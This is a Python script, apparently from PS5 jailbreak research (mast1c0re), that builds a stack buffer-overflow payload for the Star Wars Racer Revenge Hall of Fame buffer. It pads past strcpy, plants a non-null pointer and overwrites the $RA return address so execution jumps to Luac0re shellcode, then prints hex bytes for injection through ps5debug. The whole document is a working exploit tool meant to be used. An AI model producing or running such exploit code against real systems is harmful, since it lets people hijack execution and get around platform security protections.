#!/usr/bin/env python3
"""
Hall of Fame Payload Generator for Star Wars Racer Revenge
Mast1c0re research on PS5 FW 4.03

This payload is injected at the Hall of Fame buffer (0x800060B7D2)
and redirects execution to Luac0re's shellcode at 0x500000.

Buffer layout (from research):
  Offset 0-267:   Padding (268 bytes)
  Offset 268-271: Data pointer (must not contain nulls - strcpy stops at null!)
  Offset 272-381: Padding (110 bytes)
  Offset 382-385: $RA return address (controls execution!)

To use:
  1. First write Luac0re shellcode to PS2 address 0x500000 (native: 0x8000000500000)
  2. Run this script to generate the Hall of Fame payload
  3. Write the payload to 0x800060B7D2 using ps5debug
  4. In game: Options → Hall of Fame → shellcode executes
"""

import struct

# Configuration
SHELLCODE_TARGET = 0x80500000  # PS2 KSEG0 address where shellcode is loaded
VALID_POINTER = 0x01010101     # Non-null pointer to avoid strcpy termination
PAYLOAD_SIZE = 386             # Total size needed

def generate_payload():
    payload = bytearray(PAYLOAD_SIZE)

    # Offset 0-267: Padding with 0x41 ('A')
    for i in range(268):
        payload[i] = 0x41

    # Offset 268-271: Valid pointer (no null bytes!)
    struct.pack_into('<I', payload, 268, VALID_POINTER)

    # Offset 272-381: More padding with 0x41
    for i in range(272, 382):
        payload[i] = 0x41

    # Offset 382-385: Return address ($RA) - points to shellcode
    struct.pack_into('<I', payload, 382, SHELLCODE_TARGET)

    return bytes(payload)

def main():
    payload = generate_payload()

    print("=" * 60)
    print("Hall of Fame Payload for Star Wars Racer Revenge")
    print("=" * 60)
    print()
    print(f"Target shellcode address: 0x{SHELLCODE_TARGET:08X}")
    print(f"Valid pointer (no nulls): 0x{VALID_POINTER:08X}")
    print(f"Total payload size: {len(payload)} bytes")
    print()

    # Show layout
    print("Payload Layout:")
    print(f"  Offset 0-267:   0x41 padding ({268} bytes)")
    print(f"  Offset 268-271: {payload[268:272].hex()} (data pointer)")
    print(f"  Offset 272-381: 0x41 padding ({110} bytes)")
    print(f"  Offset 382-385: {payload[382:386].hex()} ($RA → 0x{SHELLCODE_TARGET:08X})")
    print()

    # Save binary payload
    with open('hall_of_fame_payload.bin', 'wb') as f:
        f.write(payload)
    print("Saved: hall_of_fame_payload.bin")

    # Generate hex string for manual injection
    print()
    print("=" * 60)
    print("HEX BYTES TO INJECT AT 0x800060B7D2:")
    print("=" * 60)
    print()

    # Print in rows of 32 bytes
    hex_str = payload.hex().upper()
    for i in range(0, len(hex_str), 64):
        offset = i // 2
        row = hex_str[i:i+64]
        # Add spaces every 2 chars for readability
        spaced = ' '.join(row[j:j+2] for j in range(0, len(row), 2))
        print(f"  +{offset:03X}: {spaced}")

    print()
    print("=" * 60)
    print("PowerShell command to write this payload:")
    print("=" * 60)
    print()
    print("# In ps4reaper or via ps5debug:")
    print("# Write these bytes to address 0x800060B7D2")
    print()

    # Generate compact hex for copy-paste
    print(f"Hex (compact): {payload.hex()}")

    return payload

if __name__ == "__main__":
    main()
